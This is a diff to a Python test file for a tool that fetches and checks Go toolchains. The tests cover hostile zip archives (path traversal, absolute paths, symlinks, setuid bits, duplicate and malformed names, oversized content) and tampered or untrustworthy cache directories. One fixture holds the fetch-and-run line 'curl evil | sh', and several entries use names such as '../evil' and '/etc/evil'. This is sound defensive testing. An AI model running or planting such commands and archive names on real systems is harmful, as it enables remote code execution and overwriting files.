@@ -6,8 +6,13 @@ import base64
 import functools
 import hashlib
 import io
+import os
+import stat
+import struct
 import zipfile
+import zlib
 from email.message import Message
+from pathlib import Path
 from urllib.error import HTTPError, URLError
 
 import pytest
@@ -116,6 +121,21 @@ def _served(
     }
 
 
+def _fetcher(served: dict[str, bytes], asked: list[str] | None = None) -> go.Fetcher:
+    """*served*'s body at each url, 404 elsewhere; unreachable when *served* is empty."""
+
+    def fetch(url: str) -> bytes:
+        if asked is not None:
+            asked.append(url)
+        if not served:
+            raise URLError("no route to host")
+        if url not in served:
+            raise HTTPError(url, 404, "Not Found", Message(), None)
+        return served[url]
+
+    return fetch
+
+
 TAMPERED = {**FILES, "bin/go": b"#!/bin/sh\ncurl evil | sh\n"}
 
 
@@ -158,14 +178,7 @@ def test_a_fetched_go_runs_only_once_the_checksum_database_vouches_for_it(
     monkeypatch.setattr("platform.machine", lambda: "x86_64")
     asked: list[str] = []
 
-    def fetcher(url: str) -> bytes:
-        asked.append(url)
-        if not served:
-            raise URLError("no route to host")
-        if url not in served:
-            raise HTTPError(url, 404, "Not Found", Message(), None)
-        return served[url]
-
+    fetcher = _fetcher(served, asked)
     root = go.toolchains_dir() / NAME
     if refused is not None:
         with pytest.raises(SourceError, match=refused) as failed:
@@ -179,7 +192,7 @@ def test_a_fetched_go_runs_only_once_the_checksum_database_vouches_for_it(
     assert (root / "bin" / "go").stat().st_mode & 0o111
     assert (root / "pkg/tool/linux_amd64/compile").stat().st_mode & 0o111
     assert not (root / "VERSION").stat().st_mode & 0o111
-    assert (root / go.VERIFIED).read_text(encoding="utf-8") == f"{_h1(FILES)}\n"
+    assert (root / go.VERIFIED).read_text(encoding="utf-8") == f"{MODULE} {_h1(FILES)}\n"
     fetched = len(asked)
     assert go.fetch_go(NAME, fetcher=fetcher) == root and len(asked) == fetched
 
@@ -314,3 +327,166 @@ def test_a_record_is_proven_in_the_tree_from_the_tiles(size: int, index: int) ->
 )
 def test_a_tile_number_is_spelled_as_tlog_spells_it(n: int, path: str) -> None:
     assert go._tile_index(n) == path
+
+
+Entry = tuple[bytes, bytes, int, int]
+"""``(name, data, mode, method)`` of a zip entry, the name as raw bytes."""
+
+
+def _entry(rel: str | bytes, data: bytes = b"x", mode: int = 0o644, method: int = 0) -> Entry:
+    name = rel if isinstance(rel, bytes) else f"{MODULE}/{rel}".encode()
+    return name, data, mode, method
+
+
+def _raw_zip(entries: list[Entry]) -> bytes:
+    """A zip written byte by byte, so names, modes and methods are exactly *entries*'
+    (``zipfile`` would mark a non-ASCII name UTF-8 and refuse to write a duplicate)."""
+    out, central = bytearray(), bytearray()
+    for name, data, mode, method in entries:
+        crc, offset = zlib.crc32(data), len(out)
+        sizes = (crc, len(data), len(data), len(name))
+        out += struct.pack("<IHHHHHIIIHH", 0x04034B50, 20, 0, method, 0, 0, *sizes, 0)
+        out += name + data
+        central += struct.pack(
+            "<IHHHHHHIIIHHHHHII",
+            *(0x02014B50, 0x0314, 20, 0, method, 0, 0, *sizes, 0, 0, 0, 0, mode << 16, offset),
+        )
+        central += name
+    count = len(entries)
+    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, count, count, len(central), len(out), 0)
+    return bytes(out + central + end)
+
+
+def _raw_h1(entries: list[Entry]) -> str:
+    """``dirhash.Hash1`` of *entries*, over their names' bytes as Go's ``archive/zip`` has them."""
+    lines = b"".join(
+        hashlib.sha256(data).hexdigest().encode() + b"  " + name + b"\n"
+        for name, data, _, _ in sorted(entries)
+    )
+    return "h1:" + base64.b64encode(hashlib.sha256(lines).digest()).decode()
+
+
+def _zip_url() -> str:
+    return f"{go.GO_PROXY}/{PATH}/@v/{VERSION}.zip"
+
+
+GO = _entry("bin/go", b"#!/bin/sh\n", 0o755)
+LINK = 0o120777
+SETUID = 0o104755
+
+
+@pytest.mark.parametrize(
+    ("entries", "refused"),
+    [
+        ([GO, _entry(f"{MODULE}/test/".encode() + b"\xc3\x84foo.go")], None),
+        ([_entry("bin/go", b"#!/bin/sh\n", SETUID), _entry("pkg/tool/x", b"t", 0o6777)], None),
+        ([_entry("bin/go", b"/usr/bin/sh", LINK)], None),
+        ([GO, _entry("../evil")], "outside golang.org/toolchain"),
+        ([GO, _entry(b"/etc/evil")], "outside golang.org/toolchain"),
+        ([GO, _entry(MODULE.replace(NAME, "go1.24.0").encode() + b"/bin/go")], "outside"),
+        ([GO, _entry("./VERSION")], "outside golang.org/toolchain"),
+        ([GO, _entry("bin/")], "outside golang.org/toolchain"),
+        ([GO, _entry("bin/go")], "names b'golang.org/toolchain@.*/bin/go' twice"),
+        ([GO, _entry("bad\nname")], "names a file"),
+        ([GO, _entry("bad\0name")], "names a file"),
+        ([GO, _entry("VERSION", method=12)], "compressed as go cannot read"),
+        ([GO, _entry("bin/go/x")], "cannot unpack it into"),
+        ([_entry("VERSION")], "the zip holds no bin/go"),
+        ([GO, _entry("VERSION", b"y" * 600)], "unpacks to more than 0 MiB"),
+    ],
+    ids=[
+        "raw-name",
+        "setuid",
+        "symlink",
+        "traversal",
+        "absolute",
+        "other-module",
+        "dot",
+        "directory",
+        "duplicate",
+        "newline",
+        "nul",
+        "bzip2",
+        "file-under-file",
+        "no-go",
+        "too-big",
+    ],
+)
+def test_a_vouched_zip_unpacks_only_into_its_release_with_plain_modes(
+    monkeypatch: pytest.MonkeyPatch, entries: list[Entry], refused: str | None
+) -> None:
+    """Even a zip the checksum database vouched for writes nothing outside the release and
+    no link, setuid bit or mode it names; the dirhash reads names as Go's raw bytes."""
+    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
+    monkeypatch.setattr("platform.machine", lambda: "x86_64")
+    monkeypatch.setattr(go, "_UNZIPPED_LIMIT", 512)
+    served = {**_served(FILES, second=_record(_raw_h1(entries))), _zip_url(): _raw_zip(entries)}
+    root = go.toolchains_dir() / NAME
+    if refused is not None:
+        with pytest.raises(SourceError, match=refused):
+            go.fetch_go(NAME, fetcher=_fetcher(served))
+        assert not any(go.toolchains_dir().iterdir())
+        return
+    assert go.fetch_go(NAME, fetcher=_fetcher(served)) == root
+    for name, data, _, _ in entries:
+        path = root / os.fsdecode(name.removeprefix(f"{MODULE}/".encode()))
+        assert stat.S_ISREG(path.lstat().st_mode) and path.read_bytes() == data
+        command = path.is_relative_to(root / "bin") or path.is_relative_to(root / "pkg/tool")
+        assert stat.S_IMODE(path.lstat().st_mode) == (0o755 if command else 0o644)
+    assert sorted(p.name for p in go.toolchains_dir().iterdir()) == [NAME]
+
+
+def _plant(root: Path, marker: str | None, *, link: bool, mode: int) -> None:
+    """A *root* as an earlier run, a crash or another program could have left it."""
+    target = root.with_name(".elsewhere") if link else root
+    (target / "bin").mkdir(parents=True)
+    (target / "bin" / "go").write_bytes(b"#!/bin/sh\necho planted\n")
+    if marker is not None:
+        (target / go.VERIFIED).write_text(marker, encoding="utf-8")
+    target.chmod(mode)
+    if link:
+        root.symlink_to(target)
+
+
+@pytest.mark.parametrize(
+    ("marker", "link", "mode", "kept"),
+    [
+        (f"{MODULE} {_h1(FILES)}\n", False, 0o755, True),
+        (None, False, 0o755, False),
+        (f"{_h1(FILES)}\n", False, 0o755, False),
+        (f"{MODULE.replace('amd64', 'arm64')} {_h1(FILES)}\n", False, 0o755, False),
+        (f"{MODULE} sha256:x\n", False, 0o755, False),
+        (f"{MODULE} {_h1(FILES)}\n", True, 0o755, False),
+        (f"{MODULE} {_h1(FILES)}\n", False, 0o757, False),
+    ],
+    ids=["verified", "half-copy", "old-marker", "other-arch", "bad-hash", "link", "writable"],
+)
+def test_a_cached_release_runs_again_only_with_its_marker(
+    monkeypatch: pytest.MonkeyPatch, marker: str | None, link: bool, mode: int, kept: bool
+) -> None:
+    """A release in the cache is used without the network only when its marker names this
+    module and a hash, in a plain directory no one else can write; anything else there is
+    moved aside and the release fetched again."""
+    monkeypatch.setattr(go, "SUMDB_KEY", _key(SEED))
+    monkeypatch.setattr("platform.machine", lambda: "x86_64")
+    root = go.toolchains_dir() / NAME
+    _plant(root, marker, link=link, mode=mode)
+    asked: list[str] = []
+    assert go.fetch_go(NAME, fetcher=_fetcher(_served(FILES), asked)) == root
+    assert (asked == []) is kept
+    assert ((root / "bin" / "go").read_bytes() == FILES["bin/go"]) is not kept
+    assert not root.is_symlink()
+    if link:
+        assert (root.with_name(".elsewhere") / "bin" / "go").is_file()
+
+
+def test_a_toolchains_directory_others_can_write_is_refused(
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    monkeypatch.setattr("platform.machine", lambda: "x86_64")
+    directory = go.toolchains_dir()
+    directory.mkdir(parents=True)
+    directory.chmod(0o777)
+    with pytest.raises(SourceError, match="others can write it") as failed:
+        go.fetch_go(NAME, fetcher=_fetcher({}))
+    assert f"Remove {directory}" in str(failed.value.hint)
